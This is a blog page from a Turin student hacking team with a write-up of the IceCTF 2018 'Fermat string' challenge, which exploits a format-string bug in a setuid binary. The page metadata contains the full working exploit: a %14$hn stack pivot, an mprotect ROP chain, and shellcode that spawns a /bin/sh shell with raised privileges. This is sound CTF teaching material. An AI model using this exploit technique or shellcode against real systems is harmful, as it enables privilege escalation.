<!DOCTYPE html>
<html lang="">
  <head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="/assets/css/style.css?v=a616a6c49b80aca7c63f5b23814b1d7b0805bfaa">
  <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>IceCTF 2018 - Fermat string Writeup | pwnthem0le</title>
<meta name="generator" content="Jekyll v3.7.3" />
<meta property="og:title" content="IceCTF 2018 - Fermat string Writeup" />
<meta name="author" content="madt1m" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Does size matter? The challenge description gives us some hint about Format Strings attacks, and the ability to exploit their phenomenal powers…in a Itty-Bitty living space :) […a margin of paper] Some Analysis Which kind of beast are we facing? A run of checksec and file: With PIE disabled, and the binary statically linked, we basically have every address we desire carved in a stone. Running multiple times the binary in target machine, with gdb set disable-randomization off, also confirms that stack addresses are stable during different runs. This time, we do have the source code to analyze. Let’s take a look. #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; void welcome(void) { char *user = getenv(&quot;USER&quot;); char buf[1000 + (user != NULL ? strlen(user) : 0)]; memset (buf, 0, sizeof(buf)); snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); printf (&quot;%s&quot;, buf); /* Careful */ } void payload(char *input) { char buf[16]; int i, cnt = -1; welcome(); /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\n&quot;); return; } /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\n&quot;); return; } memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); } void dispatch(int argc, char **argv) { if (argc &gt; 1){ payload (argv[1]); } else { printf(&quot;Usage: %s &lt;payload&gt;\n&quot;, argv[0]); } } int main(int argc, char **argv) { dispatch (argc, argv); return 0; } We can provide two kinds of inputs: input, which will be delivered as argv[1] via command line. USER, via environment variable. About input int i, cnt = -1; ... ... /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\n&quot;); return; } It is clear that the protection mechanism will be triggered with at least two uses of ‘%’ character. So we have only one format specifier to shoot. /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\n&quot;); return; } Here it is, our tiny margin of space. Length of the string cannot seemingly exceed 7 characters. memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); At last, a format string vulnerability! About USER char buf[1000 + (user != NULL ? strlen(user) : 0)]; ... ... snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); The buffer grows together with the length of our env input. This means we can stretch it quite a lot :) Planning The Attack NX enabled, PIE disabled, binary is statically linked. We have a way to write over memory (format strings) and a way to fill the stack with arbitrary input (USER env variable copied in buf). We have static address for pretty much everything. I have a clear goal in mind: Place in USER a payload composed of: A ROPchain calling mprotect() to enable RWX permissions on a stack page; A shellcode to setreuid(1337, 1337) &amp; execve(&quot;/bin/sh&quot;, NULL, NULL) Exploit the format string vulnerability to jump to my previously placed payload. NOTE The reason I need setreuid(1337, 1337) lays in how Linux and bash handle permissions. fermat binary is owned by target user, with setuid bit enabled. This means that every user running the binary will run it with owner permissions, which we need to read the flag. However, in our target machine, /bin/sh links to /bin/bash, and for security reasons the latter drops suid privileges when executed. The solution to this is to call setreuid(), which sets our real_id to be equal to our current effective_id. Linux manual is there for more informations on the argument :) So, back to the business…I need a reliable way to start my ROPchain. In technical words, this means that ESP register must point to the beginning of the fake stack I have injected via USER variable, and EIP register must point to a ret instruction. To keep things short, I’ll explain here how I managed to obtain the above, together with the exploit. For your information, getting to that solution required a lot of trial and error, and searching thru the stack and text section with GDB. The Exploit Let’s see how to use our format string vulnerability. This is a snapshot of memory layout when hitting the vulnerable printf(): Looking at output from bt and stack we can examine the how stack frames where formed. We are in function payload(), and there on the stack we have: Saved EBP and Saved EIP (pointing to dispatch + 40) to restore dispatch; Saved EBP and Saved EIP (pointing to main + 42) to restore main; We will use a stack pivoting technique to make ESP point to our fake stack. The idea is to overwrite Saved EBP in dispatch frame, at address 0xffffd5a8, to point to our payload injected in welcome(). How? We have 7 characters. The following input: %14$hn writes 0 in the two bytes starting at the address pointed by the 14th word after the format string. In practice: Looking back at the image, the 14th word after the format string is at address 0xffffd588; This address points to 0xffffd5a8; So, our format string will write 0x0 into 0xffffd5a8 and 0xffffd5a9 Previously, 0xffffd5a8 contained value 0xffffd5c8; After printf(), it will contain value 0xffff0000. Now, remember the welcome() function? Thanks to that function, we can write a huge payload into memory, and buffer will grow (in stack, so towards lower addresses), so that we can make the area now written in Saved BP (0xffff0000) pointing to our payload. Now I needed to find a way to write that value into ESP and trigger the ROPChain. The trick to trigger stack pivoting is using the two leave instruction in dispatch and main: The first leave moves ESP to current EBP, then copies our overwritten SBP into EBP; The second leave moves ESP to current EBP - which we injected in the previous frame - then pops the SBP into EBP, but this doesn’t matter since ESP points to our payload now :) I slightly modified this approach because of these instructions in main: Following leave, the value in memory pointed by ecx - 4 is moved into esp. Luckily, we can control the content of ecx, since it is loaded in: mov ecx, DWORD PTR [ebp - 0x4], and ebp is already pointing to our fake stack. The rest of the work has just been writing a ROPchain which didn’t contain NULL bytes (that couldn’t reside in env) – but since the binary is statically linked, I have a whole load of ROP gadgets already linked to binary, found with ropper – and carefully computing addresses inside and outside gdb. Here, the script to generate the payload, which I used in target machine with: USER=$(python exploit.py) ./fermat &quot;%14\$hn&quot; import struct def p32(address): return struct.pack(&quot;I&quot;, address) # To compute addresses to store args to mprotect mprotect_base = 0xffff105c # mprotect requires a page aligned boundary stackpage_base = 0xffff1000 # setreuid(geteuid(), geteuid()) &amp;&amp; execve(&quot;/bin//sh&quot;, NULL, NULL) shellcode = &quot;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46&quot; shellcode += &quot;\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68&quot; shellcode += &quot;\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&quot; movdpedx = 0x08055a2b # mov dword ptr [edx], eax; ret xoreax = 0x08049743 # xor eax, eax; ret inceax = 0x0807f1bf # inc eax; ret popedx = 0x08073bda # pop edx; ret popeax = 0x080bd026 # pop eax; ret mprotect = 0x8072c50 # address to mprotect # The ropchain computes args to mprotect and pushes them # to the right address in fake stack, which is after mprotect_base. # mprotect_base is a value I have computed by trial, looking # at where, after payload injection, mprotect address was loaded # into fake stack. ropchain = p32(popedx) + p32(mprotect_base + 4) + p32(popeax) ropchain += p32(stackpage_base - 1) + p32(inceax) + p32(movdpedx) ropchain += p32(popedx) + p32(mprotect_base + 8) + p32(xoreax) ropchain += p32(inceax) + p32(movdpedx) + p32(popedx) + p32(mprotect_base + 12) ropchain += p32(xoreax) + p32(inceax)*7 + p32(movdpedx) + p32(mprotect) # mprotect_base + 16 points to the shellcode; we need to ret to it. # BBBB*3 will be overwritten at runtime by movdpedx gadgets. ropchain += p32(mprotect_base + 16) + &quot;BBBB&quot;*3 payload = &quot;A&quot;*6394 # Distance between 0xffff0000 - 0x4 and start of USER payload += p32(0xffff1004) # address to load into esp + 0x4 payload += &#39;A&#39;*4096 # JUNK payload += ropchain payload += shellcode payload += &#39;A&#39;*(30000 - len(payload)) # just because I used 30k to compute addresses and experiment. print(payload) IceCTF{s1ze_matt3rs_n0t}" />
<meta property="og:description" content="Does size matter? The challenge description gives us some hint about Format Strings attacks, and the ability to exploit their phenomenal powers…in a Itty-Bitty living space :) […a margin of paper] Some Analysis Which kind of beast are we facing? A run of checksec and file: With PIE disabled, and the binary statically linked, we basically have every address we desire carved in a stone. Running multiple times the binary in target machine, with gdb set disable-randomization off, also confirms that stack addresses are stable during different runs. This time, we do have the source code to analyze. Let’s take a look. #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; void welcome(void) { char *user = getenv(&quot;USER&quot;); char buf[1000 + (user != NULL ? strlen(user) : 0)]; memset (buf, 0, sizeof(buf)); snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); printf (&quot;%s&quot;, buf); /* Careful */ } void payload(char *input) { char buf[16]; int i, cnt = -1; welcome(); /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\n&quot;); return; } /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\n&quot;); return; } memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); } void dispatch(int argc, char **argv) { if (argc &gt; 1){ payload (argv[1]); } else { printf(&quot;Usage: %s &lt;payload&gt;\n&quot;, argv[0]); } } int main(int argc, char **argv) { dispatch (argc, argv); return 0; } We can provide two kinds of inputs: input, which will be delivered as argv[1] via command line. USER, via environment variable. About input int i, cnt = -1; ... ... /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\n&quot;); return; } It is clear that the protection mechanism will be triggered with at least two uses of ‘%’ character. So we have only one format specifier to shoot. /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\n&quot;); return; } Here it is, our tiny margin of space. Length of the string cannot seemingly exceed 7 characters. memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); At last, a format string vulnerability! About USER char buf[1000 + (user != NULL ? strlen(user) : 0)]; ... ... snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); The buffer grows together with the length of our env input. This means we can stretch it quite a lot :) Planning The Attack NX enabled, PIE disabled, binary is statically linked. We have a way to write over memory (format strings) and a way to fill the stack with arbitrary input (USER env variable copied in buf). We have static address for pretty much everything. I have a clear goal in mind: Place in USER a payload composed of: A ROPchain calling mprotect() to enable RWX permissions on a stack page; A shellcode to setreuid(1337, 1337) &amp; execve(&quot;/bin/sh&quot;, NULL, NULL) Exploit the format string vulnerability to jump to my previously placed payload. NOTE The reason I need setreuid(1337, 1337) lays in how Linux and bash handle permissions. fermat binary is owned by target user, with setuid bit enabled. This means that every user running the binary will run it with owner permissions, which we need to read the flag. However, in our target machine, /bin/sh links to /bin/bash, and for security reasons the latter drops suid privileges when executed. The solution to this is to call setreuid(), which sets our real_id to be equal to our current effective_id. Linux manual is there for more informations on the argument :) So, back to the business…I need a reliable way to start my ROPchain. In technical words, this means that ESP register must point to the beginning of the fake stack I have injected via USER variable, and EIP register must point to a ret instruction. To keep things short, I’ll explain here how I managed to obtain the above, together with the exploit. For your information, getting to that solution required a lot of trial and error, and searching thru the stack and text section with GDB. The Exploit Let’s see how to use our format string vulnerability. This is a snapshot of memory layout when hitting the vulnerable printf(): Looking at output from bt and stack we can examine the how stack frames where formed. We are in function payload(), and there on the stack we have: Saved EBP and Saved EIP (pointing to dispatch + 40) to restore dispatch; Saved EBP and Saved EIP (pointing to main + 42) to restore main; We will use a stack pivoting technique to make ESP point to our fake stack. The idea is to overwrite Saved EBP in dispatch frame, at address 0xffffd5a8, to point to our payload injected in welcome(). How? We have 7 characters. The following input: %14$hn writes 0 in the two bytes starting at the address pointed by the 14th word after the format string. In practice: Looking back at the image, the 14th word after the format string is at address 0xffffd588; This address points to 0xffffd5a8; So, our format string will write 0x0 into 0xffffd5a8 and 0xffffd5a9 Previously, 0xffffd5a8 contained value 0xffffd5c8; After printf(), it will contain value 0xffff0000. Now, remember the welcome() function? Thanks to that function, we can write a huge payload into memory, and buffer will grow (in stack, so towards lower addresses), so that we can make the area now written in Saved BP (0xffff0000) pointing to our payload. Now I needed to find a way to write that value into ESP and trigger the ROPChain. The trick to trigger stack pivoting is using the two leave instruction in dispatch and main: The first leave moves ESP to current EBP, then copies our overwritten SBP into EBP; The second leave moves ESP to current EBP - which we injected in the previous frame - then pops the SBP into EBP, but this doesn’t matter since ESP points to our payload now :) I slightly modified this approach because of these instructions in main: Following leave, the value in memory pointed by ecx - 4 is moved into esp. Luckily, we can control the content of ecx, since it is loaded in: mov ecx, DWORD PTR [ebp - 0x4], and ebp is already pointing to our fake stack. The rest of the work has just been writing a ROPchain which didn’t contain NULL bytes (that couldn’t reside in env) – but since the binary is statically linked, I have a whole load of ROP gadgets already linked to binary, found with ropper – and carefully computing addresses inside and outside gdb. Here, the script to generate the payload, which I used in target machine with: USER=$(python exploit.py) ./fermat &quot;%14\$hn&quot; import struct def p32(address): return struct.pack(&quot;I&quot;, address) # To compute addresses to store args to mprotect mprotect_base = 0xffff105c # mprotect requires a page aligned boundary stackpage_base = 0xffff1000 # setreuid(geteuid(), geteuid()) &amp;&amp; execve(&quot;/bin//sh&quot;, NULL, NULL) shellcode = &quot;\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46&quot; shellcode += &quot;\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68&quot; shellcode += &quot;\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80&quot; movdpedx = 0x08055a2b # mov dword ptr [edx], eax; ret xoreax = 0x08049743 # xor eax, eax; ret inceax = 0x0807f1bf # inc eax; ret popedx = 0x08073bda # pop edx; ret popeax = 0x080bd026 # pop eax; ret mprotect = 0x8072c50 # address to mprotect # The ropchain computes args to mprotect and pushes them # to the right address in fake stack, which is after mprotect_base. # mprotect_base is a value I have computed by trial, looking # at where, after payload injection, mprotect address was loaded # into fake stack. ropchain = p32(popedx) + p32(mprotect_base + 4) + p32(popeax) ropchain += p32(stackpage_base - 1) + p32(inceax) + p32(movdpedx) ropchain += p32(popedx) + p32(mprotect_base + 8) + p32(xoreax) ropchain += p32(inceax) + p32(movdpedx) + p32(popedx) + p32(mprotect_base + 12) ropchain += p32(xoreax) + p32(inceax)*7 + p32(movdpedx) + p32(mprotect) # mprotect_base + 16 points to the shellcode; we need to ret to it. # BBBB*3 will be overwritten at runtime by movdpedx gadgets. ropchain += p32(mprotect_base + 16) + &quot;BBBB&quot;*3 payload = &quot;A&quot;*6394 # Distance between 0xffff0000 - 0x4 and start of USER payload += p32(0xffff1004) # address to load into esp + 0x4 payload += &#39;A&#39;*4096 # JUNK payload += ropchain payload += shellcode payload += &#39;A&#39;*(30000 - len(payload)) # just because I used 30k to compute addresses and experiment. print(payload) IceCTF{s1ze_matt3rs_n0t}" />
<link rel="canonical" href="http://localhost:4000/2018/09/14/icectffermat.html" />
<meta property="og:url" content="http://localhost:4000/2018/09/14/icectffermat.html" />
<meta property="og:site_name" content="pwnthem0le" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2018-09-14T00:00:00-04:00" />
<script type="application/ld+json">
{"description":"Does size matter? The challenge description gives us some hint about Format Strings attacks, and the ability to exploit their phenomenal powers…in a Itty-Bitty living space :) […a margin of paper] Some Analysis Which kind of beast are we facing? A run of checksec and file: With PIE disabled, and the binary statically linked, we basically have every address we desire carved in a stone. Running multiple times the binary in target machine, with gdb set disable-randomization off, also confirms that stack addresses are stable during different runs. This time, we do have the source code to analyze. Let’s take a look. #define _GNU_SOURCE #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/types.h&gt; void welcome(void) { char *user = getenv(&quot;USER&quot;); char buf[1000 + (user != NULL ? strlen(user) : 0)]; memset (buf, 0, sizeof(buf)); snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); printf (&quot;%s&quot;, buf); /* Careful */ } void payload(char *input) { char buf[16]; int i, cnt = -1; welcome(); /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\\n&quot;); return; } /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\\n&quot;); return; } memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); } void dispatch(int argc, char **argv) { if (argc &gt; 1){ payload (argv[1]); } else { printf(&quot;Usage: %s &lt;payload&gt;\\n&quot;, argv[0]); } } int main(int argc, char **argv) { dispatch (argc, argv); return 0; } We can provide two kinds of inputs: input, which will be delivered as argv[1] via command line. USER, via environment variable. About input int i, cnt = -1; ... ... /* Ensure there aren&#39;t any rogue format string conversions in here */ for (i = 0; i &lt; strlen(input); i++) { if (input[i] == &#39;%&#39;) cnt++; } if (cnt &gt; 0) { fprintf (stderr, &quot;No `%%&#39; characters allowed!\\n&quot;); return; } It is clear that the protection mechanism will be triggered with at least two uses of ‘%’ character. So we have only one format specifier to shoot. /* Make sure input isn&#39;t too long */ if (strlen (input) &gt; 7) { fprintf (stderr, &quot;Your payload is too large!\\n&quot;); return; } Here it is, our tiny margin of space. Length of the string cannot seemingly exceed 7 characters. memset (buf, 0, sizeof(buf)); /* Avoid security problems by checking length, just in case */ strncpy (buf, input, sizeof(buf)-1); printf (buf); At last, a format string vulnerability! About USER char buf[1000 + (user != NULL ? strlen(user) : 0)]; ... ... snprintf (buf, sizeof(buf), &quot;Welcome to Fermat&#39;s Last Exploit, %s!&quot;, user); The buffer grows together with the length of our env input. This means we can stretch it quite a lot :) Planning The Attack NX enabled, PIE disabled, binary is statically linked. We have a way to write over memory (format strings) and a way to fill the stack with arbitrary input (USER env variable copied in buf). We have static address for pretty much everything. I have a clear goal in mind: Place in USER a payload composed of: A ROPchain calling mprotect() to enable RWX permissions on a stack page; A shellcode to setreuid(1337, 1337) &amp; execve(&quot;/bin/sh&quot;, NULL, NULL) Exploit the format string vulnerability to jump to my previously placed payload. NOTE The reason I need setreuid(1337, 1337) lays in how Linux and bash handle permissions. fermat binary is owned by target user, with setuid bit enabled. This means that every user running the binary will run it with owner permissions, which we need to read the flag. However, in our target machine, /bin/sh links to /bin/bash, and for security reasons the latter drops suid privileges when executed. The solution to this is to call setreuid(), which sets our real_id to be equal to our current effective_id. Linux manual is there for more informations on the argument :) So, back to the business…I need a reliable way to start my ROPchain. In technical words, this means that ESP register must point to the beginning of the fake stack I have injected via USER variable, and EIP register must point to a ret instruction. To keep things short, I’ll explain here how I managed to obtain the above, together with the exploit. For your information, getting to that solution required a lot of trial and error, and searching thru the stack and text section with GDB. The Exploit Let’s see how to use our format string vulnerability. This is a snapshot of memory layout when hitting the vulnerable printf(): Looking at output from bt and stack we can examine the how stack frames where formed. We are in function payload(), and there on the stack we have: Saved EBP and Saved EIP (pointing to dispatch + 40) to restore dispatch; Saved EBP and Saved EIP (pointing to main + 42) to restore main; We will use a stack pivoting technique to make ESP point to our fake stack. The idea is to overwrite Saved EBP in dispatch frame, at address 0xffffd5a8, to point to our payload injected in welcome(). How? We have 7 characters. The following input: %14$hn writes 0 in the two bytes starting at the address pointed by the 14th word after the format string. In practice: Looking back at the image, the 14th word after the format string is at address 0xffffd588; This address points to 0xffffd5a8; So, our format string will write 0x0 into 0xffffd5a8 and 0xffffd5a9 Previously, 0xffffd5a8 contained value 0xffffd5c8; After printf(), it will contain value 0xffff0000. Now, remember the welcome() function? Thanks to that function, we can write a huge payload into memory, and buffer will grow (in stack, so towards lower addresses), so that we can make the area now written in Saved BP (0xffff0000) pointing to our payload. Now I needed to find a way to write that value into ESP and trigger the ROPChain. The trick to trigger stack pivoting is using the two leave instruction in dispatch and main: The first leave moves ESP to current EBP, then copies our overwritten SBP into EBP; The second leave moves ESP to current EBP - which we injected in the previous frame - then pops the SBP into EBP, but this doesn’t matter since ESP points to our payload now :) I slightly modified this approach because of these instructions in main: Following leave, the value in memory pointed by ecx - 4 is moved into esp. Luckily, we can control the content of ecx, since it is loaded in: mov ecx, DWORD PTR [ebp - 0x4], and ebp is already pointing to our fake stack. The rest of the work has just been writing a ROPchain which didn’t contain NULL bytes (that couldn’t reside in env) – but since the binary is statically linked, I have a whole load of ROP gadgets already linked to binary, found with ropper – and carefully computing addresses inside and outside gdb. Here, the script to generate the payload, which I used in target machine with: USER=$(python exploit.py) ./fermat &quot;%14\\$hn&quot; import struct def p32(address): return struct.pack(&quot;I&quot;, address) # To compute addresses to store args to mprotect mprotect_base = 0xffff105c # mprotect requires a page aligned boundary stackpage_base = 0xffff1000 # setreuid(geteuid(), geteuid()) &amp;&amp; execve(&quot;/bin//sh&quot;, NULL, NULL) shellcode = &quot;\\x6a\\x31\\x58\\x99\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46&quot; shellcode += &quot;\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68&quot; shellcode += &quot;\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80&quot; movdpedx = 0x08055a2b # mov dword ptr [edx], eax; ret xoreax = 0x08049743 # xor eax, eax; ret inceax = 0x0807f1bf # inc eax; ret popedx = 0x08073bda # pop edx; ret popeax = 0x080bd026 # pop eax; ret mprotect = 0x8072c50 # address to mprotect # The ropchain computes args to mprotect and pushes them # to the right address in fake stack, which is after mprotect_base. # mprotect_base is a value I have computed by trial, looking # at where, after payload injection, mprotect address was loaded # into fake stack. ropchain = p32(popedx) + p32(mprotect_base + 4) + p32(popeax) ropchain += p32(stackpage_base - 1) + p32(inceax) + p32(movdpedx) ropchain += p32(popedx) + p32(mprotect_base + 8) + p32(xoreax) ropchain += p32(inceax) + p32(movdpedx) + p32(popedx) + p32(mprotect_base + 12) ropchain += p32(xoreax) + p32(inceax)*7 + p32(movdpedx) + p32(mprotect) # mprotect_base + 16 points to the shellcode; we need to ret to it. # BBBB*3 will be overwritten at runtime by movdpedx gadgets. ropchain += p32(mprotect_base + 16) + &quot;BBBB&quot;*3 payload = &quot;A&quot;*6394 # Distance between 0xffff0000 - 0x4 and start of USER payload += p32(0xffff1004) # address to load into esp + 0x4 payload += &#39;A&#39;*4096 # JUNK payload += ropchain payload += shellcode payload += &#39;A&#39;*(30000 - len(payload)) # just because I used 30k to compute addresses and experiment. print(payload) IceCTF{s1ze_matt3rs_n0t}","author":{"@type":"Person","name":"madt1m"},"@type":"BlogPosting","url":"http://localhost:4000/2018/09/14/icectffermat.html","headline":"IceCTF 2018 - Fermat string Writeup","dateModified":"2018-09-14T00:00:00-04:00","datePublished":"2018-09-14T00:00:00-04:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2018/09/14/icectffermat.html"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

    <body>
      <header>
  <div class="container">
    <center>
      <h1>pwnthem0le</h1>
      <section id="downloads">
        <a href="/index.html" class="btn btn-github">Home</a>
        <a href="/blog/index.html" class="btn btn-github">Blog</a>
        <a href="/about.html" class="btn btn-github">About</a>
        <a href="/join.html" class="btn btn-github">Join Us!</a>
      </section>
      <h2>pwnthem0le is a Turin-based, hacking students group born out of CyberChallenge 2018.
</h2>
    </center>
  </div>
</header>


      <div class="container">
        <small>14 September 2018</small>
          <h1>IceCTF 2018 - Fermat string Writeup</h1>
            <i><p class="view">by madt1m</p></i>

              <h1 id="does-size-matter">Does size matter?</h1>

<p>The challenge description gives us some hint about Format Strings attacks, and the ability to exploit their phenomenal powers…in a Itty-Bitty living space :) […<em>a margin of paper</em>]</p>

<h2 id="some-analysis">Some Analysis</h2>
<p>Which kind of beast are we facing? A run of <code class="highlighter-rouge">checksec</code> and <code class="highlighter-rouge">file</code>:</p>

<p><img src="/media/images/icectffermat_1.JPG" alt="AltText" />
<img src="/media/images/icectffermat_2.JPG" alt="AltText" /></p>

<p>With PIE disabled, and the binary statically linked, we basically have
every address we desire carved in a stone. Running multiple times the binary in target machine, with gdb <code class="highlighter-rouge">set disable-randomization off</code>, also confirms that stack addresses are stable during different runs.</p>

<p>This time, we do have the source code to analyze. Let’s take a look.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;


void welcome(void)
{
	char *user = getenv("USER");
	char buf[1000 + (user != NULL ? strlen(user) : 0)];
	memset (buf, 0, sizeof(buf));
	snprintf (buf, sizeof(buf), "Welcome to Fermat's Last Exploit, %s!", user);
	printf ("%s", buf); /* Careful */
}


void payload(char *input) {
    char buf[16];
    int i, cnt = -1;

    welcome();

    /* Make sure input isn't too long */
    if (strlen (input) &gt; 7)
    {
    	fprintf (stderr, "Your payload is too large!\n");
    	return;
    }


    /* Ensure there aren't any rogue format string conversions in here */
    for (i = 0; i &lt; strlen(input); i++)
    {
    	if (input[i] == '%')
		cnt++;
    }
    if (cnt &gt; 0)
    {
    	fprintf (stderr, "No `%%' characters allowed!\n");
    	return;
    }

    memset (buf, 0, sizeof(buf));
    /* Avoid security problems by checking length, just in case */
    strncpy (buf, input, sizeof(buf)-1);
    printf (buf);
}



void dispatch(int argc, char **argv)
{
    if (argc &gt; 1){
        payload (argv[1]);
    } else {
        printf("Usage: %s &lt;payload&gt;\n", argv[0]);
    }
}

int main(int argc, char **argv) {
    dispatch (argc, argv);

    return 0;
}
</code></pre></div></div>

<p>We can provide two kinds of inputs:</p>
<ul>
  <li><code class="highlighter-rouge">input</code>, which will be delivered as <strong>argv[1]</strong> via command line.</li>
  <li><code class="highlighter-rouge">USER</code>, via environment variable.</li>
</ul>

<h3 id="about-input">About <code class="highlighter-rouge">input</code></h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int i, cnt = -1;
...
...
/* Ensure there aren't any rogue format string conversions in here */
    for (i = 0; i &lt; strlen(input); i++)
    {
        if (input[i] == '%')
        cnt++;
    }
    if (cnt &gt; 0)
    {
        fprintf (stderr, "No `%%' characters allowed!\n");
        return;
    }
</code></pre></div></div>

<p>It is clear that the protection mechanism will be triggered with at least two uses of ‘%’ character. So we have only one format specifier to shoot.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/* Make sure input isn't too long */
    if (strlen (input) &gt; 7)
    {
        fprintf (stderr, "Your payload is too large!\n");
        return;
    }
</code></pre></div></div>
<p>Here it is, our tiny margin of space. Length of the string cannot seemingly exceed 7 characters.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>memset (buf, 0, sizeof(buf));
/* Avoid security problems by checking length, just in case */
strncpy (buf, input, sizeof(buf)-1);
printf (buf);
</code></pre></div></div>
<p>At last, a <a href="https://www.owasp.org/index.php/Format_string_attack">format string</a> vulnerability!</p>

<h3 id="about-user">About <code class="highlighter-rouge">USER</code></h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>char buf[1000 + (user != NULL ? strlen(user) : 0)];
...
...
snprintf (buf, sizeof(buf), "Welcome to Fermat's Last Exploit, %s!", user);

</code></pre></div></div>

<p>The buffer grows together with the length of our env input. This means we can stretch it quite a lot :)</p>

<h2 id="planning-the-attack">Planning The Attack</h2>

<p>NX enabled, PIE disabled, binary is statically linked. We have a way to write over memory (<strong>format strings</strong>) and a way to fill the stack with arbitrary input (<strong><code class="highlighter-rouge">USER</code> env variable copied in buf</strong>). We have static address for pretty much everything.</p>

<p>I have a clear goal in mind:</p>

<ol>
  <li>Place in <code class="highlighter-rouge">USER</code> a payload composed of:
    <ul>
      <li>A ROPchain calling <code class="highlighter-rouge">mprotect()</code> to enable RWX permissions on a stack page;</li>
      <li>A shellcode to <code class="highlighter-rouge">setreuid(1337, 1337)</code> &amp; <code class="highlighter-rouge">execve("/bin/sh", NULL, NULL)</code></li>
    </ul>
  </li>
  <li>Exploit the format string vulnerability to jump to my previously placed payload.</li>
</ol>

<hr />
<h4 id="note"><em>NOTE</em></h4>

<p>The reason I need <code class="highlighter-rouge">setreuid(1337, 1337)</code> lays in how Linux and bash handle permissions. <code class="highlighter-rouge">fermat</code> binary is owned by <code class="highlighter-rouge">target</code> user, with setuid bit enabled. This means that every user running the binary will run it with owner permissions, which we need to read the flag.</p>

<p>However, in our target machine, <code class="highlighter-rouge">/bin/sh</code> links to <code class="highlighter-rouge">/bin/bash</code>, and for security reasons the latter drops suid privileges when executed.</p>

<p>The solution to this is to call <code class="highlighter-rouge">setreuid()</code>, which sets our <strong>real_id</strong> to be equal to our current <strong>effective_id</strong>. Linux manual is there for more informations on the argument :)</p>

<hr />

<p>So, back to the business…I need a reliable way to start my ROPchain.</p>

